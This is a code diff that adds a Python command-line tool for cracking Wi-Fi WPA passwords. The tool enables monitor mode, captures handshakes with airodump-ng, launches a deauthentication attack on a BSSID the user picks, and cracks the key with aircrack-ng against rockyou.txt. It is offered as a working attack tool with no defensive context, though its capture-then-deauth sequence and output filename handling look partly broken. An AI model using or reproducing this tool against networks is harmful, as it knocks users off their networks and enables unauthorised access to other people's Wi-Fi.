@@ -1,1 +1,144 @@
-add it 
+#!/usr/bin/env python3
+
+import os
+import subprocess
+import sys
+import time
+import signal
+import atexit
+import threading
+from simple_term_menu import TerminalMenu
+from rich.console import Console
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
+
+console = Console()
+
+# === Global Variables ===
+interface = ""
+bssid = ""
+channel = ""
+ssid = ""
+handshake_file = "handshake.cap"
+
+# === Banner ===
+BANNER = r"""
+:'#######::::::'######:::::'###::::'##::::'##:'########:'########:'########::
+'##.... ##::::'##... ##:::'## ##::: ###::'###: ##.....:: ##.....:: ##.... ##:
+##:::: ##:::: ##:::..:::'##:. ##:: ####'####: ##::::::: ##::::::: ##:::: ##:
+##:::: ##::::. ######::'##:::. ##: ## ### ##: ######::: ######::: ########::
+##:::: ##:::::..... ##: #########: ##. #: ##: ##...:::: ##...:::: ##.. ##:::
+##:::: ##::::'##::: ##: ##.... ##: ##:.:: ##: ##::::::: ##::::::: ##::. ##::
+. #######:::::. ######:: ##:::: ##: ##:::: ##: ########: ########: ##:::. ##:
+:.......:::::::......:::..:::::..::..:::::..::........::........::..:::::..::
+"""
+
+# === Cleanup on exit ===
+def cleanup():
+    if interface:
+        console.print(f"[cyan]\nRestoring {interface} to managed mode...[/cyan]")
+        subprocess.call(f"sudo airmon-ng stop {interface}", shell=True)
+        subprocess.call("sudo systemctl start NetworkManager", shell=True)
+        subprocess.call("sudo systemctl start wpa_supplicant", shell=True)
+
+atexit.register(cleanup)
+signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
+signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
+
+# === Check if required tools are installed ===
+def check_dependencies():
+    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
+    for tool in tools:
+        if subprocess.call(f"which {tool}", shell=True, stdout=subprocess.DEVNULL) != 0:
+            console.print(f"[red]{tool} not found. Install aircrack-ng first.[/red]")
+            sys.exit(1)
+
+# === Select wireless interface ===
+def select_interface():
+    global interface
+    result = subprocess.run("iw dev | grep Interface", shell=True, capture_output=True)
+    interfaces = [line.strip().split()[-1] for line in result.stdout.decode().splitlines()]
+    if not interfaces:
+        console.print("[red]No wireless interfaces found.[/red]")
+        sys.exit(1)
+
+    menu = TerminalMenu(interfaces, title="Select your Wi-Fi interface:")
+    interface = interfaces[menu.show()]
+
+    subprocess.call("sudo systemctl stop NetworkManager", shell=True)
+    subprocess.call("sudo systemctl stop wpa_supplicant", shell=True)
+    subprocess.call(f"sudo airmon-ng start {interface}", shell=True)
+
+    if "mon" not in interface:
+        interface += "mon"
+
+# === Scan for Wi-Fi targets ===
+def scan_target():
+    global bssid, channel, ssid
+    console.print("[bold yellow]\nLaunching airodump-ng (press Ctrl+C to stop and select target)...[/bold yellow]")
+    time.sleep(2)
+
+    os.system(f"sudo airodump-ng {interface} -w {handshake_file} --output-format cap")
+
+    bssid = input("Enter target BSSID: ").strip()
+    channel = input("Enter channel: ").strip()
+    ssid = input("Enter SSID (name of Wi-Fi): ").strip()
+
+# === Start deauthentication attack ===
+def start_deauth():
+    console.print("[bold red]\nStarting deauthentication attack...[/bold red]")
+    subprocess.Popen(f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}", shell=True)
+    time.sleep(5)
+
+# === Crack WPA using wordlist ===
+def crack_password(wordlist):
+    console.print(f"[bold green]\nStarting password cracking using wordlist: {wordlist}[/bold green]")
+    command = f"sudo aircrack-ng {handshake_file} -w {wordlist} -b {bssid}"
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TimeRemainingColumn(),
+        transient=True,
+    ) as progress:
+        task = progress.add_task("[cyan]Cracking WPA password...", total=None)
+        while True:
+            line = process.stdout.readline()
+            if b"KEY FOUND!" in line:
+                progress.update(task, description="[bold green]KEY FOUND![/bold green]")
+                break
+            if not line:
+                break
+            time.sleep(0.1)
+        progress.stop()
+
+# === Choose wordlist ===
+def choose_wordlist():
+    choices = ["Built-in wordlist (/usr/share/wordlists/rockyou.txt)", "Custom wordlist"]
+    menu = TerminalMenu(choices, title="Choose your wordlist:")
+    choice = menu.show()
+
+    if choice == 0:
+        return "/usr/share/wordlists/rockyou.txt"
+    else:
+        path = input("Enter full path to your custom wordlist: ").strip()
+        if not os.path.isfile(path):
+            console.print("[red]Wordlist not found![/red]")
+            sys.exit(1)
+        return path
+
+# === Main ===
+def main():
+    os.system("clear")
+    console.print(BANNER, style="bold blue")
+    check_dependencies()
+    select_interface()
+    scan_target()
+    start_deauth()
+    wordlist = choose_wordlist()
+    crack_password(wordlist)
+    console.print("[bold green]\nFinished.[/bold green]")
+
+if __name__ == "__main__":
+    main()
